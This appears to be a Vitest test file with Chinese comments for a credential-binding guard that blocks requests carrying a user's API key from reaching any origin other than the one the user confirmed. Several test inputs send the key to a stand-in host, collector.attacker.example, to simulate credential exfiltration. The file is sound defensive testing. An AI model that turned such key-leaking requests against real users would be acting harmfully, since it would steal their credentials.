// 凭据绑定不变量（§6.1）：**带着用户密钥的请求，只能去他保存这把 key 时确认过的那个 origin。**
//
// 这份夹具零额度、零真请求：DNS / 环境 / 代理全注入，判据在请求发出**之前**跑完。
// 三条「同源拒绝」各对应一条真实来路，不是同一条判据写三遍：
//   ① 说明卡里一条**绝对 URL** 指向别家（校验器挡得住新卡，挡不住已经落库的旧 mapping）；
//   ② **上传初始化端点**带着 key 去了别家（`assetIngestion.endpoint` 是第二个带 key 的出口）；
//   ③ **旧数据 / 手改的 catalog 文件**——vendor 行上的地址被换掉，而密钥原样留着。
// 每条都配阳性对照：没有对照的绿灯说不清是「判对了」还是「一律拦 / 一律放行」。
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { authorizeSubmitDestination, setSubmitOutboundDepsForTests } from "./vendorOutboundGuard";
import {
  deriveCredentialBinding,
  judgeCredentialDestination,
  readCredentialBinding,
} from "../catalog/credentialBinding";
import { codeDeclaredFallbackOrigins } from "./vendorBaseFallback";
import { matchNomiErrorCode } from "../shared/nomiErrorCodes";
import { VendorRequestError, requestJson } from "./vendorHttp";
import type { Vendor } from "../catalog/types";
import type { OutboundEnvironment } from "../networkOutboundPolicy";

const NO_LOCAL_PROXY: OutboundEnvironment = { syntheticResolver: false, syntheticSample: "" };

function seedPublicInternet(): void {
  setSubmitOutboundDepsForTests({
    resolve: async () => [{ address: "104.18.32.7", family: 4 as const }],
    readEnvironment: async () => NO_LOCAL_PROXY,
    isApplicationProxyActive: () => false,
  });
}

/** 一条「用户在贴 key 页上确认过 https://api.relay.example 」的连接。 */
function boundVendor(overrides: Record<string, unknown> = {}) {
  const row = {
    key: "relay",
    name: "Relay",
    enabled: true,
    baseUrlHint: "https://api.relay.example",
    authType: "bearer" as const,
    createdAt: "t",
    updatedAt: "t",
    ...overrides,
  };
  return { ...row, credentialBinding: deriveCredentialBinding(row, "2026-09-18T00:00:00.000Z") };
}

describe("凭据绑定：key 只去用户确认过的 origin", () => {
  beforeEach(() => setSubmitOutboundDepsForTests(null));

  it("① 说明卡里一条绝对 URL 指向别家 → 带 key 的请求被拦，且挂的是凭据绑定那条码", async () => {
    seedPublicInternet();
    const refusal = await authorizeSubmitDestination({
      vendor: boundVendor(),
      url: "https://collector.attacker.example/v1/images/generations",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    });
    expect(refusal).toBeTruthy();
    expect(matchNomiErrorCode(refusal as string)).toBe("outbound-blocked-credential-origin");
    // 两个事实都要在错误里，否则用户没法判断「是我自己换了地址」还是「有人改了它」。
    expect(refusal as string).toContain("bound=https://api.relay.example");
    expect(refusal as string).toContain("attempted=https://collector.attacker.example");
  });

  it("② 上传初始化端点（第二个带 key 的出口）指向别家 → 同样拦下", async () => {
    seedPublicInternet();
    const refusal = await authorizeSubmitDestination({
      vendor: boundVendor(),
      url: "https://uploads.other.example/v1/uploads",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    });
    expect(matchNomiErrorCode(refusal as string)).toBe("outbound-blocked-credential-origin");
  });

  it("③ 旧数据 / 手改 catalog：vendor 行地址被换掉而密钥原样留着 → 拦下（校验器看不见这一类）", async () => {
    seedPublicInternet();
    // 绑定写的是保存 key 那一刻的 origin；有人事后把 baseUrlHint 改成别家，绑定不会跟着变。
    const tampered = { ...boundVendor(), baseUrlHint: "https://api.elsewhere.example" };
    const refusal = await authorizeSubmitDestination({
      vendor: tampered,
      url: "https://api.elsewhere.example/v1/chat/completions",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    });
    expect(matchNomiErrorCode(refusal as string)).toBe("outbound-blocked-credential-origin");
  });

  it("【阳性对照】同一条连接、同一个 origin → 放行（否则这条判据只是「一律拦」）", async () => {
    seedPublicInternet();
    await expect(authorizeSubmitDestination({
      vendor: boundVendor(),
      url: "https://api.relay.example/v1/images/generations",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    })).resolves.toBeNull();
  });

  it("【阳性对照】不带 key 的第二步上传（预签名 URL）不受这条判据管——它是动态目标，本来就不带 key", async () => {
    seedPublicInternet();
    await expect(authorizeSubmitDestination({
      vendor: boundVendor(),
      url: "https://s3.amazonaws.example/bucket/abc?signature=1",
      routedThroughProviderProxy: false,
      carriesCredential: false,
    })).resolves.toBeNull();
  });

  it("【阳性对照】代码里写死的官方备用域放行——自愈梯子不是「有人改了地址」", async () => {
    seedPublicInternet();
    const apimart = {
      key: "apimart",
      name: "APIMart",
      enabled: true,
      baseUrlHint: "https://api.apimart.ai",
      authType: "bearer" as const,
      createdAt: "t",
      updatedAt: "t",
    };
    expect(codeDeclaredFallbackOrigins("apimart")).toContain("https://api.apib.ai");
    await expect(authorizeSubmitDestination({
      vendor: { ...apimart, credentialBinding: deriveCredentialBinding(apimart, "t") },
      url: "https://api.apib.ai/v1/tasks",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    })).resolves.toBeNull();
  });

  it("没有绑定（旧装机 / curated 种子 / ComfyUI）= 这条判据不成立，交回私网策略——不许把「不知道」当「拒绝」", async () => {
    seedPublicInternet();
    await expect(authorizeSubmitDestination({
      vendor: { key: "legacy", baseUrlHint: "https://api.legacy.example", credentialBinding: undefined },
      url: "https://api.legacy.example/v1/tasks",
      routedThroughProviderProxy: false,
      carriesCredential: true,
    })).resolves.toBeNull();
  });

  it("绑定是纯函数：读回来的就是写下去的那一份", () => {
    const row = { baseUrlHint: "https://api.relay.example/v1", authType: "x-api-key" as const, authHeader: "X-Key" };
    const binding = deriveCredentialBinding(row, "2026-09-18T00:00:00.000Z");
    expect(binding.origin).toBe("https://api.relay.example");
    expect(readCredentialBinding({ credentialBinding: binding })).toEqual(binding);
    // 绑定是顶层字段，不是 meta 杂物袋里的一个字符串键——一条安全不变量不该由字符串键维护。
    expect(readCredentialBinding({ credentialBinding: undefined })).toBeUndefined();
    expect(judgeCredentialDestination({ binding, url: "https://api.relay.example/v1/x", codeDeclaredOrigins: [] }).allowed).toBe(true);
    expect(judgeCredentialDestination({ binding, url: "https://other.example/v1/x", codeDeclaredOrigins: [] }).allowed).toBe(false);
  });
});

// ── 端到端：请求**一个字节都没离开本机** ─────────────────────────────────────────────
//
// 上面那组测的是判据本身。这一条测的是它挂对了位置：判据跑在 fetch 之前，所以「没扣费」
// 这句话是靠**位置**成立的，不是靠文案（与 vendorBaseFallback 文件头第 3 条同一个道理：
// 连接未建立 ⇒ 不可能已计费）。fetch 被换成一个「被调用就算失败」的桩。
describe("端到端：带 key 的请求被拦时，fetch 从未被调用", () => {
  beforeEach(() => {
    setSubmitOutboundDepsForTests({
      resolve: async () => [{ address: "93.184.216.34", family: 4 as const }],
      readEnvironment: async () => NO_LOCAL_PROXY,
      isApplicationProxyActive: () => false,
    });
  });
  afterEach(() => {
    setSubmitOutboundDepsForTests(null);
    vi.unstubAllGlobals();
  });

  it("旧数据里一条指向别家的绝对 URL → VendorRequestError，且 fetch 零次调用", async () => {
    const fetchSpy = vi.fn(async () => new Response("{}", { status: 200 }));
    vi.stubGlobal("fetch", fetchSpy);
    const vendor = {
      key: "relay",
      name: "Relay",
      enabled: true,
      authType: "bearer",
      baseUrlHint: "https://api.relay.example",
      credentialBinding: deriveCredentialBinding({ baseUrlHint: "https://api.relay.example", authType: "bearer" }, "t"),
      createdAt: "t",
      updatedAt: "t",
    } as unknown as Vendor;
    const error = await requestJson(
      vendor,
      "sk-live",
      "POST",
      "https://collector.attacker.example/v1/images/generations",
      {},
      {},
      { prompt: "x" },
    ).catch((failure) => failure);
    expect(error).toBeInstanceOf(VendorRequestError);
    expect(matchNomiErrorCode(String((error as Error).message))).toBe("outbound-blocked-credential-origin");
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});
